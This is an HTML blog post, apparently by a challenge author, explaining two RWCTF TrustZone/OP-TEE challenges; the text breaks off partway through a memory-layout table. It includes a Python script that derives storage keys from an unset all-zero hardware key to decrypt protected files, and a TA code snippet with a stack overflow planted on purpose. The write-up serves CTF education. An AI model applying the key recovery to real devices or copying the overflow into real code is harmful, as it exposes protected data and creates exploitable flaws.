<!DOCTYPE html>
<html lang=EN>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <meta property="og:type" content="article">
<meta property="og:title" content="RWCTF-4th TrustZone challenge Writeup">
<meta property="og:url" content="https://bestwing.me/RWCTF-4th-TrustZone-challenge-Writeup.html">
<meta property="og:site_name" content="Swing&#39;Blog 浮生若梦">
<meta property="og:locale">
<meta property="og:image" content="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201131815700.png">
<meta property="og:image" content="https://github.com/ForgeRock/optee-os/raw/master/documentation/images/secure_storage/block_data_encryption.png">
<meta property="og:image" content="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201241428539.png">
<meta property="og:image" content="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202112311553854.png">
<meta property="article:published_time" content="2022-01-23T16:00:00.000Z">
<meta property="article:modified_time" content="2022-01-25T05:25:15.845Z">
<meta property="article:author" content="Swing">
<meta property="article:tag" content="pwn">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201131815700.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>RWCTF-4th TrustZone challenge Writeup</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
      
<link rel="stylesheet" href="/css/rtl.css">

    
    <!-- rss -->
    
    
      <link rel="alternate" href="/atom.xml" title="Swing&#39;Blog 浮生若梦" type="application/atom+xml" />
    
<meta name="generator" content="Hexo 5.4.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Articles</a></li>
         
          <li><a href="/search">Search</a></li>
         
          <li><a href="/atom.xml">RSS</a></li>
         
          <li><a href="/categories/">Categories</a></li>
         
          <li><a href="/link">Links</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        
        <li><a class="icon" href="/CVE-2021-42342-Goahead.html"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://bestwing.me/RWCTF-4th-TrustZone-challenge-Writeup.html"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=https://bestwing.me/RWCTF-4th-TrustZone-challenge-Writeup.html&text=RWCTF-4th TrustZone challenge Writeup"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://bestwing.me/RWCTF-4th-TrustZone-challenge-Writeup.html&title=RWCTF-4th TrustZone challenge Writeup"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://bestwing.me/RWCTF-4th-TrustZone-challenge-Writeup.html&is_video=false&description=RWCTF-4th TrustZone challenge Writeup"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=RWCTF-4th TrustZone challenge Writeup&body=Check out this article: https://bestwing.me/RWCTF-4th-TrustZone-challenge-Writeup.html"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=https://bestwing.me/RWCTF-4th-TrustZone-challenge-Writeup.html&title=RWCTF-4th TrustZone challenge Writeup"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=https://bestwing.me/RWCTF-4th-TrustZone-challenge-Writeup.html&title=RWCTF-4th TrustZone challenge Writeup"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://bestwing.me/RWCTF-4th-TrustZone-challenge-Writeup.html&title=RWCTF-4th TrustZone challenge Writeup"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=https://bestwing.me/RWCTF-4th-TrustZone-challenge-Writeup.html&title=RWCTF-4th TrustZone challenge Writeup"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://bestwing.me/RWCTF-4th-TrustZone-challenge-Writeup.html&name=RWCTF-4th TrustZone challenge Writeup&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://bestwing.me/RWCTF-4th-TrustZone-challenge-Writeup.html&t=RWCTF-4th TrustZone challenge Writeup"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#TrustZone-challenge"><span class="toc-number">1.</span> <span class="toc-text">TrustZone challenge</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Trust-or-Not"><span class="toc-number">1.1.</span> <span class="toc-text">Trust or Not</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#TL-DR"><span class="toc-number">1.1.1.</span> <span class="toc-text">TL;DR</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Ideas"><span class="toc-number">1.1.2.</span> <span class="toc-text">Ideas</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Solved"><span class="toc-number">1.1.3.</span> <span class="toc-text">Solved</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#UnTrustZone"><span class="toc-number">1.2.</span> <span class="toc-text">UnTrustZone</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#TL-DR-1"><span class="toc-number">1.2.1.</span> <span class="toc-text">TL;DR</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Ideas-1"><span class="toc-number">1.2.2.</span> <span class="toc-text">Ideas</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Debug"><span class="toc-number">1.2.2.1.</span> <span class="toc-text">Debug</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E5%B8%83%E5%B1%80"><span class="toc-number">1.2.2.2.</span> <span class="toc-text">内存布局</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Solved-1"><span class="toc-number">1.2.3.</span> <span class="toc-text">Solved</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reference"><span class="toc-number">2.</span> <span class="toc-text">Reference</span></a></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        RWCTF-4th TrustZone challenge Writeup
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">Swing</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2022-01-23T16:00:00.000Z" itemprop="datePublished">2022-01-24</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fas fa-archive"></i>
        <a class="category-link" href="/categories/Writeup/">Writeup</a>
    </div>


      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link-link" href="/tags/pwn/" rel="tag">pwn</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="Foreword"><a href="#Foreword" class="headerlink" title="Foreword"></a>Foreword</h2><p>第四届 realworldctf 我和 @chennan 出了三个题目，分别是  <code>Trust or Not</code>, <code>UnTrustZone</code> and <code>Wheels on the Bus</code>， 其中   <code>Trust or Not</code>, <code>UnTrustZone</code>  是和 TrustZone 相关的题目。</p>
<h2 id="TrustZone-challenge"><a href="#TrustZone-challenge" class="headerlink" title="TrustZone challenge"></a>TrustZone challenge</h2><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201131815700.png" title="image-20220113181523560" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201131815700.png" alt="image-20220113181523560"></a></p>
<p>TrustZone是基于硬件的安全功能，它通过对原有硬件架构进行修改，在处理器层次引入了两个不同权限的保护域——安全世界和普通世界，任何时刻处理器仅在其中的一个环境内运行。同时这两个世界完全是硬件隔离的，并具有不同的权限，正常世界中运行的应用程序或操作系统访问安全世界的资源受到严格的限制，反过来安全世界中运行的程序可以正常访问正常世界中的资源。这种两个世界之间的硬件隔离和不同权限等属性为保护应用程序的代码和数据提供了有效的机制：通常正常世界用于运行商品操作系统（例如Android、iOS等），该操作系统提供了正常执行环境（Rich Execution Environment，REE）；安全世界则始终使用安全的小内核（TEE-kernel）提供可信执行环境（Trusted Execution Environment，TEE），机密数据可以在TEE中被存储和访问。</p>
<h3 id="Trust-or-Not"><a href="#Trust-or-Not" class="headerlink" title="Trust or Not"></a>Trust or Not</h3><p>题目描述：</p>
<blockquote>
<p>Trust or Not</p>
<p>Score: <em>357</em></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;Reverse&#96;, &#96;difficulty:normal</span><br></pre></td></tr></table></figure>

<p>We have lost some of our files and cannot retrieve the plaintext data originally stored.</p>
<p>Hint: flag file is stored in <code>/data/tee/2</code> securely.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;nc 47.242.114.24 7788</span><br></pre></td></tr></table></figure>

<p><a href="https://realworldctf-attachment.oss-accelerate.aliyuncs.com/Trust_or_not_fa542592446c43678f685913495da668.tar.gz">attachment</a></p>
</blockquote>
<h4 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h4><p>要解决这个题目，首先要了解什么是安全存储。 数据要么以某种加密/授权的方式存储在linux文件系统<code>/data/tee</code>中，要么存储在Emmc RPMB（Replay Protected Memory Block）分区中。这次的相关题目主要使用了 <code>OP-TEE</code>的开源项目，其更详细的信息可以在<a href="https://github.com/ForgeRock/optee-os/blob/master/documentation/secure_storage.md">OP-TEE文档</a> 中找到。</p>
<p> **Hardware Unique Key （HUK） ** </p>
<p>大多数设备都有某种硬件唯一密钥（HUK），主要用于派生其他密钥。例如，当派生密钥用于安全存储等时，可以使用 HUK 派生。HUK 的重要之处在于它需要得到很好的保护，并且在最好的情况下，HUK 永远不应该直接从软件读取，甚至不应该从安全方面读取。有不同的解决方案，加密加速器可能支持它，或者，它可能涉及另一个安全的协处理器。</p>
<p> <strong>Secure Storage Key （SSK）</strong> </p>
<p>SSK是每个设备的密钥，在OP-TEE启动时生成并存储在安全内存中。SSK用于派生TA存储密钥（TSK）。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SSK &#x3D; HMACSHA256 (HUK, Chip ID || “static string”)</span><br></pre></td></tr></table></figure>

<p>获取硬件唯一密钥（HUK）和芯片ID的功能取决于平台实现。目前，OP-TEE 系统中每台设备只有一把 SSK，用于安全存储子系统。但是，为了将来，我们可能需要为每台设备使用生成 SSK 的相同算法为不同的子系统创建不同的密钥。为不同子系统生成不同的密钥的简单方法是使用不同的静态生成密钥的字符串。</p>
<p> <strong>Trusted Application Storage Key （TSK）</strong>  </p>
<p>TA存储密钥</p>
<p>TSK是每个受信任的应用程序密钥，由SSK和TA的标识符（UUID）生成。它被用来保护FEK，换句话说，用来加密/解密FEK。</p>
<p>代码实现：<code>build/optee_os/core/tee/tee_fs_key_manager.c</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (uuid) &#123;</span><br><span class="line">	res = do_hmac(tsk, <span class="keyword">sizeof</span>(tsk), tee_fs_ssk.key,</span><br><span class="line">		      TEE_FS_KM_SSK_SIZE, uuid, <span class="keyword">sizeof</span>(*uuid));</span><br><span class="line">	<span class="keyword">if</span> (res != TEE_SUCCESS)</span><br><span class="line">		<span class="keyword">return</span> res;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Pick something of a different size than TEE_UUID to</span></span><br><span class="line"><span class="comment">	 * guarantee that there&#x27;s never a conflict.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">uint8_t</span> dummy[<span class="number">1</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">	res = do_hmac(tsk, <span class="keyword">sizeof</span>(tsk), tee_fs_ssk.key,</span><br><span class="line">		      TEE_FS_KM_SSK_SIZE, dummy, <span class="keyword">sizeof</span>(dummy));</span><br><span class="line">	<span class="keyword">if</span> (res != TEE_SUCCESS)</span><br><span class="line">		<span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>do_hmac 这里使用的是 HMAC_SHA256</p>
<p>最后就是</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TSK &#x3D; HMACSHA256 (SSK, TA_UUID)</span><br></pre></td></tr></table></figure>

<p><strong>File Encryption Key （FEK）</strong> </p>
<p>当一个新的TEE文件被创建时，密钥管理器将通过 PRNG（pesudo随机数生成器）为TEE文件生成一个新的 FEK，并将加密的 FEK 存储在 meta 文件中。FEK 用于对存储在 meta 文件中的TEE文件信息或块文件中的数据进行加密/解密。</p>
<h4 id="Ideas"><a href="#Ideas" class="headerlink" title="Ideas"></a>Ideas</h4><p>通过逆向和比对OP-Tee的源代码，希望选手能发现 <code>HUK</code>没有被设置。然后flag被加密了且存储在 <code>/data/tee/2</code> 文件里</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">TEE_Result __fastcall <span class="title">tee_otp_get_hw_unique_key</span><span class="params">(tee_hw_unique_key *hwkey)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">memset</span>(hwkey, <span class="number">0</span>, <span class="keyword">sizeof</span>(tee_hw_unique_key));</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>那么只要分析下安全存储的过程，可以参考如图：</p>
<p><a href="https://github.com/ForgeRock/optee-os/raw/master/documentation/images/secure_storage/block_data_encryption.png" title="Block Data Encryption" class="gallery-item"><img src="https://github.com/ForgeRock/optee-os/raw/master/documentation/images/secure_storage/block_data_encryption.png" alt="Block Data Encryption"></a></p>
<p>思路就大概是</p>
<ol>
<li>通过 <code>HUK </code> 和 <code>chip id</code> 计算出 <code>SSK</code></li>
<li>通过计算出来的<code>SSk</code> 和 <code>TA UUID</code>计算出 <code>TSK</code></li>
<li>通过计算出的 <code>TSK</code> 和 被加密的 <code>FEK</code> 计算出明文 <code>FEK</code> </li>
<li>最后通过 <code>FEK</code> 解出明文的数据</li>
</ol>
<p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201241428539.png" title="image-20220124142822275" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202201241428539.png" alt="image-20220124142822275"></a></p>
<p>其中被加密的 <code>FEK</code> 存储在 <code>/data/tee/2</code> 文件中，可以参考如下 010 tempte结构</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;------------------------------------------------</span><br><span class="line">&#x2F;&#x2F;--- 010 Editor v10.0.2 Binary Template</span><br><span class="line">&#x2F;&#x2F;</span><br><span class="line">&#x2F;&#x2F;      File: </span><br><span class="line">&#x2F;&#x2F;   Authors: </span><br><span class="line">&#x2F;&#x2F;   Version: </span><br><span class="line">&#x2F;&#x2F;   Purpose: </span><br><span class="line">&#x2F;&#x2F;  Category: </span><br><span class="line">&#x2F;&#x2F; File Mask: </span><br><span class="line">&#x2F;&#x2F;  ID Bytes: </span><br><span class="line">&#x2F;&#x2F;   History: </span><br><span class="line">&#x2F;&#x2F;------------------------------------------------</span><br><span class="line">#define TEE_FS_HTREE_IV_SIZE 16</span><br><span class="line">#define TEE_FS_HTREE_TAG_SIZE 16</span><br><span class="line">#define TEE_FS_HTREE_FEK_SIZE 16</span><br><span class="line"></span><br><span class="line">typedef struct _tee_fs_htree_meta &#123;</span><br><span class="line">	UINT64 length;</span><br><span class="line">&#125;tee_fs_htree_meta;</span><br><span class="line"></span><br><span class="line">typedef struct _tee_fs_htree_imeta &#123;</span><br><span class="line">	struct tee_fs_htree_meta meta;</span><br><span class="line">	UINT32 max_node_id;</span><br><span class="line">    UINT32 nop;</span><br><span class="line">&#125;tee_fs_htree_imeta;</span><br><span class="line"></span><br><span class="line">typedef struct _tee_fs_htree_image &#123;</span><br><span class="line">	UCHAR iv[TEE_FS_HTREE_IV_SIZE];</span><br><span class="line">	UCHAR tag[TEE_FS_HTREE_TAG_SIZE];</span><br><span class="line">	UCHAR enc_fek[TEE_FS_HTREE_FEK_SIZE];</span><br><span class="line">	UCHAR imeta[sizeof(struct tee_fs_htree_imeta)];</span><br><span class="line">	UINT32 counter;</span><br><span class="line">&#125;tee_fs_htree_image;</span><br><span class="line"></span><br><span class="line">#define TEE_FS_HTREE_HASH_SIZE		32</span><br><span class="line">#define TEE_FS_HTREE_IV_SIZE 16</span><br><span class="line">#define TEE_FS_HTREE_TAG_SIZE 16</span><br><span class="line">typedef struct _tee_fs_htree_node_image &#123;</span><br><span class="line">	&#x2F;* Note that calc_node_hash() depends on hash first in struct *&#x2F;</span><br><span class="line">	UCHAR hash[TEE_FS_HTREE_HASH_SIZE];</span><br><span class="line">	UCHAR iv[TEE_FS_HTREE_IV_SIZE];</span><br><span class="line">	UCHAR tag[TEE_FS_HTREE_TAG_SIZE];</span><br><span class="line">	USHORT flags;</span><br><span class="line">&#125;tee_fs_htree_node_image;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;--------------------------------------</span><br><span class="line">LittleEndian();</span><br><span class="line"></span><br><span class="line">tee_fs_htree_image  ver0_head;</span><br><span class="line">tee_fs_htree_image  ver1_head;</span><br><span class="line">FSeek(0x1000);</span><br><span class="line">tee_fs_htree_node_image ver0_root_node;</span><br><span class="line">tee_fs_htree_node_image ver1_root_node;</span><br><span class="line">FSeek(0x2000);</span><br></pre></td></tr></table></figure>

<h4 id="Solved"><a href="#Solved" class="headerlink" title="Solved"></a>Solved</h4><p>最后脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Hash <span class="keyword">import</span> HMAC, SHA256</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment">#计算ssk</span></span><br><span class="line">    huk = <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">16</span></span><br><span class="line">    chip_id = <span class="string">b&#x27;BEEF&#x27;</span> * <span class="number">8</span></span><br><span class="line">    print(chip_id)</span><br><span class="line">    ssk_str = <span class="string">b&#x27;ONLY_FOR_tee_fs_ssk\x00&#x27;</span></span><br><span class="line">    m = HMAC.new(huk, digestmod=SHA256)</span><br><span class="line">    m.update(chip_id)</span><br><span class="line">    m.update(ssk_str)</span><br><span class="line">    ssk = m.digest()</span><br><span class="line">    print(ssk)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#计算tsk</span></span><br><span class="line">    ta_uuid = <span class="string">b&#x27;\xbb\x50\xe7\xf4\x37\x14\xbf\x4f\x87\x85\x8d\x35\x80\xc3\x49\x94&#x27;</span> <span class="comment">#ta的uuid</span></span><br><span class="line">    m = HMAC.new(ssk, digestmod=SHA256)</span><br><span class="line">    m.update(ta_uuid)</span><br><span class="line">    tsk = m.digest()</span><br><span class="line">    print(tsk)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#解fek</span></span><br><span class="line">    enc_fek = <span class="string">b&#x27;\xe4\x9a\x95\xf2\xb5\xf4\x9c\x04\xf6\x07\x9f\xfb\xf0\x2e\xd2\xef&#x27;</span>  <span class="comment">#2在header里</span></span><br><span class="line">    cipher = AES.new(tsk, AES.MODE_ECB)</span><br><span class="line">    fek = cipher.decrypt(enc_fek)</span><br><span class="line">    print(fek)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#解数据</span></span><br><span class="line">    enc_data = <span class="string">b&#x27;....&#x27;</span></span><br><span class="line">    iv = <span class="string">b&#x27;\xb4\xc9\x6a\x22\xe6\x36\x72\xcf\x6a\x44\x8f\x10\xa3\x11\x44\x68&#x27;</span> <span class="comment">#对应node</span></span><br><span class="line">    cipher = AES.new(fek, AES.MODE_GCM, nonce=iv)</span><br><span class="line">    data = cipher.decrypt(enc_data)</span><br><span class="line">    print(data)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="UnTrustZone"><a href="#UnTrustZone" class="headerlink" title="UnTrustZone"></a>UnTrustZone</h3><p>题目描述</p>
<blockquote>
<p>UntrustZone</p>
<p>Score: <em>500</em></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Pwn&#96;, &#96;difficulty:normal</span><br></pre></td></tr></table></figure>

<p>It is clearly not worth your trust.</p>
<p>The default username is root.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 47.243.205.105 8899</span><br></pre></td></tr></table></figure>

<p><a href="https://realworldctf-attachment.oss-accelerate.aliyuncs.com/UnstrustZone_d9d2151c29fa340f80f38197492001fe.tar.gz">attachment</a></p>
</blockquote>
<h4 id="TL-DR-1"><a href="#TL-DR-1" class="headerlink" title="TL;DR"></a>TL;DR</h4><p>这个题需要补充一些关于 <code>TrustZone</code> 的另外一部分关于 <code>TA</code>和<code>CA</code>的前置知识。 <code>TA</code> 是 Trusted Application 的缩写，通常运行在 TEE 环境下的应用简称为<code> TA</code>。<code>CA</code> 是 Client Application 的缩写，通常运行在 REE 环境下的应用简称为 CA。</p>
<p>一个访问安全OS的服务流程为：打开 TEE 环境 &gt; 开启一个会话 &gt; 发送命令 &gt; 获取信息 &gt; 结束会话 &gt; 关闭 TEE 环境。</p>
<p>借助OP-TEE来实现特定安全需求时，一次完整的功能调用一般都是起源于CA，TA做具体功能实现并返回数据到CA，而整个过程需要经过OP-TEE的client端接口，OP-TEE在Linux kernel端的驱动，Monitor模式下的SMC处理，OP-TEE OS的thread处理，OP-TEE中的TA程序运行，OP-TEE端底层库或者硬件资源支持等几个阶段。当TA执行完具体请求之后会按照原路径将得到的数据返回给CA。</p>
<h4 id="Ideas-1"><a href="#Ideas-1" class="headerlink" title="Ideas"></a>Ideas</h4><p>设计这个题目的时候，就只是想让选手了解下 <code>TA</code> 这个攻击面，所以漏洞设计的得特别简单，就是一个在<code>TA</code>中的栈溢出，我修改了附件中的<code>HUK</code>和签名时候的 key 让他保持于远程的不一致。希望选手通过 Pwn 这个 TA， 来获取 安全存储，即 <code>/data/tee/2</code> 下被加密的 flag 。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">data_sz = params[<span class="number">1</span>].memref.size;</span><br><span class="line">	<span class="comment">// data = TEE_Malloc(data_sz, 0); patch for challenge</span></span><br><span class="line">	<span class="keyword">char</span> data[<span class="number">0x20</span>] ;</span><br><span class="line">	<span class="keyword">if</span> (!data)</span><br><span class="line">		<span class="keyword">return</span> TEE_ERROR_OUT_OF_MEMORY;</span><br><span class="line">	TEE_MemMove(data, params[<span class="number">1</span>].memref.buffer, data_sz);</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h5 id="Debug"><a href="#Debug" class="headerlink" title="Debug"></a>Debug</h5><p>参考： <a href="https://github.com/ForgeRock/optee-build/blob/master/docs/debug.md#debugging-op-tee">optee-build/debug.md at master · ForgeRock/optee-build (github.com)</a></p>
<ul>
<li>有 源码调试：</li>
</ul>
<p>首先对 ldelf 的入口下断， <code>b thread_enter_user_mode</code></p>
<p>然后执行 CA 程序，在 LOG 窗口中找到 TA 的加载地址<br><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202112311553854.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/202112311553854.png"></a></p>
<p>然后对 TA 入口下断， <code>b *(baseaddr + TA_InvokeCommandEntryPoint_addr</code></p>
<ul>
<li><p>无源码调试</p>
<p>OP-TEE 有日志功能，在日志功能中能看到 TA 的加载地址，可以通过这个进行调试</p>
</li>
</ul>
<h5 id="内存布局"><a href="#内存布局" class="headerlink" title="内存布局"></a>内存布局</h5><table>
<thead>
<tr>
<th>Text Address</th>
<th>File Name</th>
<th>Description</th>
</tr>
</thead>
<tbody><tr>
<td>0x0</td>
<td>bl1.elf</td>
<td>ARM Trusted Firmware Boot Loader Stage 1</td>
</tr>
<tr>
<td>0x1070</td>
<td>libteec.so</td>
<td>OP-TEE Client Shared Library [Normal World]</td>
</tr>
<tr>
<td>0x4009c0</td>
<td><CA></td>
<td>Client Application [Normal World]</td>
</tr>
<tr>
<td>0xe01b000</td>
<td>bl2.elf</td>
